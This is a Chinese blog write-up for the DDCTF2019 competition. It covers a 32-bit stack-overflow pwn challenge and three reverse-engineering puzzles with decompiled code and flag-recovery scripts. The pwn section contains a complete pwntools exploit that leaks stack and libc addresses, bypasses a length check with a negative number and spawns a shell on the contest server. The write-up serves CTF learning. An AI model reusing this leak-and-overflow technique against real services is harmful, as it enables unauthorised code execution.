---
title: DDCTF2019-writeup
date: 2019-04-18 19:41:06
tags: [pwn,RE]
---
本次DDCTF2019抱着玩一玩的心态参与了一下，事先不知道Pwn的题目这么少，RE的题目也不算多（主要RE的难题我不会做，简单题又比较水），所以就一开始做了两天，后续没有再尝试，最后排名100多位。下面简单总结一下Pwn和RE几道题的writeup。

# Pwn

pwn只有一道题目

## Strike

该题目提供了libc，防护如下：

```
liwc@ubuntu:~/pwn/DDCTF2019$ checksec xpwn 
[*] '/home/liwc/pwn/DDCTF2019/xpwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

未开启canary和PIE，只开启了NX，且为32位，有栈利用的可能。

简单运行程序发现程序首先要求输入用户名，然后在打印用户名的时候会出现一些不可见字符，这里可能存在信息泄漏漏洞。之后要求输入密码的长度，再输入密码。用IDA简单查看下：

在向栈上写name时，由于写完就用格式化字符串的%s格式输出，所以只要不输入\x00，就可以随意leak出栈上的数据。


<!-- more -->


```c++
int __cdecl sub_80485DB(FILE *stream, FILE *a2)
{
  int v2; // eax
  char buf; // [esp+0h] [ebp-48h]

  printf("Enter username: ");
  v2 = fileno(stream);
  read(v2, &buf, 0x40u);
  return fprintf(a2, "Hello %s", &buf);
}
```

调试可知，我们从ebp-0x48处开始写，而ebp-0x20处为栈地址，ebp-0x24处为libc地址，所以padding 0x48 - 0x20字节可以直接leak处栈地址和libc地址。

```
gef➤  dereference $esp 100
0xffffcf00│+0x0000: 0x00000000	 ← $esp
0xffffcf04│+0x0004: 0xffffcf10  →  0xf7ffd000  →  0x00023f40
0xffffcf08│+0x0008: 0x00000040 ("@"?)
0xffffcf0c│+0x000c: 0xffffcf88  →  0xf7e0bdc8  →  0x00002b76 ("v+"?)
0xffffcf10│+0x0010: 0xf7ffd000  →  0x00023f40  <= 从这里开始写
0xffffcf14│+0x0014: 0x080482c8  →   add BYTE PTR [ecx+ebp*2+0x62], ch
0xffffcf18│+0x0018: 0x08048258  →  0x00000057 ("W"?)
0xffffcf1c│+0x001c: 0x00000000
0xffffcf20│+0x0020: 0xf7ffda74  →  0xf7fd3470  →  0xf7ffd918  →  0x00000000
0xffffcf24│+0x0024: 0xf7e0bcc8  →  0x000029d0
0xffffcf28│+0x0028: 0xf7e5f21b  →  <setbuffer+11> add ebx, 0x151de5
0xffffcf2c│+0x002c: 0x00000000
0xffffcf30│+0x0030: 0xf7fb1000  →  0x001b1db0
0xffffcf34│+0x0034: 0xf7fb1000  →  0x001b1db0
0xffffcf38│+0x0038: 0xffffcfc8  →  0x00000000 <= main函数的ebp地址
0xffffcf3c│+0x003c: 0xf7e65005  →  <setbuf+21> add esp, 0x1c <= libc地址
0xffffcf40│+0x0040: 0xf7fb1d60  →  0xfbad2887
0xffffcf44│+0x0044: 0x00000000
0xffffcf48│+0x0048: 0x00002000
0xffffcf4c│+0x004c: 0xf7e64ff0  →  <setbuf+0> sub esp, 0x10
0xffffcf50│+0x0050: 0xf7fb1d60  →  0xfbad2887
0xffffcf54│+0x0054: 0xf7ffd918  →  0x00000000
0xffffcf58│+0x0058: 0xffffcfc8  →  0x00000000	 ← $ebp

```

然后考虑如何劫持控制流。这里注意，虽然在检查长度时会强制转换为有符号数，但是在read函数传参时仍旧把nbytes当作无符号数，所以如果输入负数，就可以绕过长度检查，实现任意长度的栈溢出。

```c++
	nbytes = read_num();
  if ( (signed int)nbytes > 63 )
  {
    puts("Too long!");
    exit(1);
  }
  printf("Enter password(lenth %u): ", nbytes);
  v1 = fileno(stdin);
  read(v1, &buf, nbytes); <= IO2BO
```

但是main函数返回的栈桢操作比较特殊，在main函数返回之前的汇编语句如下：

```
.text:08048735                 mov     eax, 0
.text:0804873A                 lea     esp, [ebp-8]
.text:0804873D                 pop     ecx
.text:0804873E                 pop     ebx
.text:0804873F                 pop     ebp
.text:08048740                 lea     esp, [ecx-4]
.text:08048743                 retn
```

首先令esp指向ebp-8处，然后分别pop三次给ecx, ebx和ebp，最后将esp指向ecx-4处，然后retn，也就是将eip转到ecx-4处开始执行代码。所以我们需要在ebp-8处布置栈，令esp和ebp均指向我们构造的栈桢处。直接看exp

```python
	payload = p32(system) # [ebp - 0x4c]
	payload += p32(main) # fake ebp of system [ebp - 0x4c + 4]
	payload += p32(stack_addr - 0x4c + 12) # arg1:the addr of /bin/sh [ebp - 0x4c + 8]
	payload += "/bin/sh\x00" # [ebp - 0x4c + 12]
	payload = payload.ljust(0x4c - 0x8 , "a") # padding to [ebp - 8]
	payload += p32(stack_addr - 0x4c + 4) # ecx = target_addr + 4
	payload += "aaaa" # ebx
	payload += p32(stack_addr - 0x4c + 4) # fake ebp
```

最终完整的exp如下：

```python
from pwn import *

elf = ELF("./xpwn")
context.log_level = "debug"

p = remote("116.85.48.105","5005")
libc = ELF("./libc.so.6")

p.recvuntil("username: ")
payload = 10 * "aaaa"
p.send(payload)
stack_addr = u32(p.recvuntil("\xff")[-4:])
p.recvuntil("\xf7")
leak = u32(p.recvuntil("\xf7")[-4:])
libc.address = leak - libc.symbols['_IO_2_1_stdout_']
system = libc.symbols['system']
# binsh = next(libc.search("/bin/sh"))

p.recvuntil("password: ")
p.sendline("-1")
p.recvuntil("): ")
main = 0x804862d
payload = p32(system)
payload += p32(main)
# payload += p32(binsh)
payload += p32(stack_addr - 0x4c + 12)
payload += "/bin/sh\x00"
payload = payload.ljust(0x4c - 0x8 , "a")
payload += p32(stack_addr - 0x4c + 4)
payload += "aaaa"
payload += p32(stack_addr - 0x4c + 4)

p.send(payload)
p.interactive()	
```

flag如下：

```
[*] Switching to interactive mode
All done, bye!
$ cat flag
DDCTF{s0_3asy_St4ck0verfl0w_r1ght?}
```

# RE

## RE1

本题相当简单，是RE的签到题，就是一个字符匹配，写脚本迭代即可。直接upx脱壳。

```python
magic = "~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!"

target = "DDCTF{reverseME}"

base_addr = 0x402ff8
first_addr = 0x403018

flag = ""
for ch in target:
	for i in range(len(magic)):
		if magic[i] == ch:
			flag += chr(i + first_addr - base_addr)
print flag

```

flag如下：

DDCTF{ZZ[JX#,9(9,+9QY!}

## RE2

本题也不算难，只是需要比上题多一点的逆向功底，可以说上题只靠调试器就能解决了。该题首先将16进制字符串解码，然后base64编码，令编码后的结果为"reserse+"即可。这里在二进制文件中并没有base64的那个明显的字符串，但是有一个64位的字符串很可疑，最后调试发现其实就是标准的base64算法。

对了，本题也加了壳，但是我记得似乎不能用upx直接脱壳，用esp定律即可。

```python
target = "reverse+"
from base64 import *
print b64decode(target).encode("hex").upper()
```

flag如下：
DDCTF{ADEBDEAEC7BE}

## Confused

本题是一道macos逆向题，这是我第一次做macOS的逆向，但其实逆向的思路都是一样的。右键点击app（当然要在osx系统下）文件，选择显示包内容，然后在/Contents/MacOS/路径下就能找到可执行文件。其实我们可以直接用IDA打开这个文件进行反汇编，然后用llgb（类似gdb）加载这个文件进行动态调试。

简单看一下，发现核心逻辑就在checkCode函数中。

函数首先检查flag是否以"DDCTF{"开头，然后检查最后一位是否为"}"，然后用substringWithRange函数获取花括号包裹的字符串，如果它的长度为18，则合法，且转为UTF8String。

```c++
void __cdecl -[ViewController checkCode:](ViewController *self, SEL a2, id a3)
{
  void *v3; // rax
  void *v4; // rax
  void *v5; // ST18_8
  void *v6; // rax
  char *v7; // rax
  void *v8; // rax
  char *v9; // rax
  void *v10; // rax
  void *v11; // rax
  void *v12; // [rsp+38h] [rbp-58h]
  void *v13; // [rsp+40h] [rbp-50h]
  __int128 v14; // [rsp+48h] [rbp-48h]
  __int64 v15; // [rsp+58h] [rbp-38h]
  SEL v16; // [rsp+60h] [rbp-30h]
  void *v17; // [rsp+68h] [rbp-28h]
  char *v18; // [rsp+70h] [rbp-20h]
  __int64 v19; // [rsp+78h] [rbp-18h]
  __int64 v20; // [rsp+80h] [rbp-10h]
  char *v21; // [rsp+88h] [rbp-8h]

  v17 = self;
  v16 = a2;
  v15 = 0LL;
  objc_storeStrong((__int64)&v15, (__int64)a3);
  v3 = objc_msgSend(v17, "pwd");
  v4 = (void *)objc_retainAutoreleasedReturnValue((__int64)v3);
  v5 = v4;
  v6 = objc_msgSend(v4, "stringValue");
  v14 = (unsigned __int64)objc_retainAutoreleasedReturnValue((__int64)v6);
  objc_release(v5);
  if ( (unsigned __int8)objc_msgSend((void *)v14, "hasPrefix:", CFSTR("DDCTF{")) )
  {
    v7 = (char *)objc_msgSend((void *)v14, "length");
    v8 = objc_msgSend((void *)v14, "substringFromIndex:", v7 - 1);
    v13 = (void *)objc_retainAutoreleasedReturnValue((__int64)v8);
    if ( (unsigned __int8)objc_msgSend(v13, "isEqualToString:", CFSTR("}")) )
    {
      v9 = (char *)objc_msgSend((void *)v14, "length");
      v19 = 6LL;
      v18 = v9 - 7;
      v20 = 6LL;
      v21 = v9 - 7;
      v10 = objc_msgSend((void *)v14, "substringWithRange:", 6LL, v9 - 7);
      v12 = (void *)objc_retainAutoreleasedReturnValue((__int64)v10);
      if ( objc_msgSend(v12, "length") == (void *)18 )
      {
        v11 = (void *)objc_retainAutorelease(v12);
        *((_QWORD *)&v14 + 1) = objc_msgSend(v11, "UTF8String");
      }
      objc_storeStrong((__int64)&v12, 0LL);
    }
    objc_storeStrong((__int64)&v13, 0LL);
  }
  if ( *((_QWORD *)&v14 + 1) )
  {
    if ( (unsigned int)sub_1000011D0(*((__int64 *)&v14 + 1)) == 1 )
      objc_msgSend(v17, "onSuccess");
    else
      objc_msgSend(v17, "onFailed");
  }
  else
  {
    objc_msgSend(v17, "onFailed");
  }
  objc_storeStrong((__int64)&v14, 0LL);
  objc_storeStrong((__int64)&v15, 0LL);
}
```



在sub_100001f60中，对一个结构体进行了初始化，填充了一些常量和函数指针，这个结构体是该题的核心。

```c++
__int64 __fastcall sub_100001F60(__int64 result, __int64 a2)
{
  *(_DWORD *)result = 0;
  *(_DWORD *)(result + 4) = 0;
  *(_DWORD *)(result + 8) = 0;
  *(_DWORD *)(result + 12) = 0;
  *(_DWORD *)(result + 16) = 0;
  *(_DWORD *)(result + 176) = 0;
  *(_BYTE *)(result + 32) = -16;
  *(_QWORD *)(result + 40) = sub_100001D70;
  *(_BYTE *)(result + 48) = -15;
  *(_QWORD *)(result + 56) = sub_100001A60;
  *(_BYTE *)(result + 64) = -14;
  *(_QWORD *)(result + 72) = sub_100001AA0;
  *(_BYTE *)(result + 80) = -12;
  *(_QWORD *)(result + 88) = sub_100001CB0;
  *(_BYTE *)(result + 96) = -11;
  *(_QWORD *)(result + 104) = sub_100001CF0;
  *(_BYTE *)(result + 112) = -13;
  *(_QWORD *)(result + 120) = sub_100001B70;
  *(_BYTE *)(result + 128) = -10;
  *(_QWORD *)(result + 136) = sub_100001B10;
  *(_BYTE *)(result + 144) = -9;
  *(_QWORD *)(result + 152) = sub_100001D30;
  *(_BYTE *)(result + 160) = -8;
  *(_QWORD *)(result + 168) = sub_100001C60;
  qword_100003F58 = malloc(0x400uLL);
  return __memcpy_chk((char *)qword_100003F58 + 48, a2, 18LL, -1LL);
}
```

由上述，逆向得到结构体中的关键变量如下

```c
struct {
  DWORD num0; // + 0
  DWORD num4; // + 4
  DWORD num8; // + 8
  DWORD num12; // + 12
  DWORD flag; // + 16
  DWORD result; // + 176
};
```

结构体中其他字段为常数和常量函数指针，后续算法中这些常数和函数指针是一一对应的。常数分别为：

```python
array = [0xf0, 0xf1, 0xf2, 0xf4, 0xf5, 0xf3, 0xf6, 0xf7, 0xf8]
```



最后在0x100001f00中，首先令结构体的0x24偏移处指向一块内存区域，然后循环调用sub_100001e50。

```c++
__int64 __fastcall sub_100001F00(__int64 myclass)
{
  *(_QWORD *)(myclass + 24) = (char *)&loc_100001980 + 4;
  while ( **(unsigned __int8 **)(myclass + 24) != 243 )
    sub_100001E50(myclass);
  free(qword_100003F58);
  return *(unsigned int *)(myclass + 176);
}
```

sub_100001e50的f5代码如下：

```c++
bool __fastcall sub_100001E50(__int64 myclass)
{
  bool result; // al
  bool v2; // [rsp+Fh] [rbp-11h]
  signed int v3; // [rsp+10h] [rbp-10h]
  signed int v4; // [rsp+14h] [rbp-Ch]

  v4 = 0;
  v3 = 0;
  while ( 1 )
  {
    v2 = 0;
    if ( !v4 )
      v2 = v3 < 9;
    result = v2;
    if ( !v2 )
      break;
    if ( **(unsigned __int8 **)(myclass + 24) == *(unsigned __int8 *)(16LL * v3 + myclass + 32) )
    {
      v4 = 1;
      (*(void (__fastcall **)(__int64))(16LL * v3 + myclass + 32 + 8))(myclass);
    }
    else
    {
      ++v3;
    }
  }
  return result;
}
```

如果那块内存区域中当前指针指向的位置的标志与相应的常数相同，就执行相应的函数指针的所指向的函数操作。

最后是需要result字段为1，而result字段为1需要调用sub_10001d30函数。

```c++
__int64 __fastcall sub_100001D30(__int64 a1)
{
  __int64 result; // rax

  result = *(unsigned int *)(*(_QWORD *)(a1 + 24) + 1LL);
  *(_DWORD *)(a1 + 176) = result;
  *(_QWORD *)(a1 + 24) += 5LL;
  return result;
}
```



看起来似乎十分复杂，但我们仔细观察一下那块内存区域。


可以看到\xf0, \xf8, \xf2, \xf6这些标志位重复的出现，而在0xc6和0xcc偏移处出两次出现\xf7，由上述sub_10001d30函数的F5代码看出，在若结构体中的指针指向0xc6处，将会把结构体中的result字段设置为1（因为紧接着\xf7的一个byte为\x01）。这时我们悟到，程序中会多次执行\xf0, \xf8, \xf2, \xf6对应的函数指针的函数操作，直到结构体中0x24处的指针走到0xc6偏移处。此时我们只需要对这四个函数进行逆向即可，下面给出这4个函数算法的Python实现。

```python
def func0():
	if magic[index + 1] == 0x10:
		num0 = magic[index + 2]
	elif magic[index + 1] == 0x11:
		num4 = magic[index + 2]
	elif magic[index + 1] == 0x12:
		num8 = magic[index + 2]
	elif magic[index + 1] == 0x13:
		num12 = magic[index + 2]
	elif magic[index + 1] == 0x14:
		num0 = input_str[cur]
	index += 6
	
def func2():
	if num0 == input_str[cur]:	
		flag = 1
	else:
		flag = 0
	index += 2
	
def func6():
	if flag == 1:
		flag = 0
	else:
		index += magic[index + 1]
	index += 2
	
def func8():
	if num0 >= 0x41 and num0 <= 0x5a:
		v5 = (2 + num0 - 65) % 26 + 65
	elif num0 >= 0x61 and num0 <= 0x7a:
		v5 = (2 + num0 - 97) % 26 + 97
	else:
		v5 = num0
	num0 = v5
	index += 1
```

​	实际上，magic bytes中每个\xf0后面跟的都是0x10，所以我们将每个\xf0后跟的第二个字节根据func8的逻辑进行变换，即可得到最后的flag。

```python
flag = ""
for i, mark in enumerate(magic):
	if ord(mark) == 0xf0 and ord(magic[i+1]) == 0x10:
		num = ord(magic[i+2])
		if num >= 0x41 and num <= 0x5a:
			num = (2 + num - 65) % 26 + 65
		elif num >= 0x61 and num <= 0x7a:
			num = (2 + num - 97) % 26 + 97
		else:
			num = num
		flag += chr(num)
print flag
```

flag如下：
DDCTF{helloYouGotTheFlag}

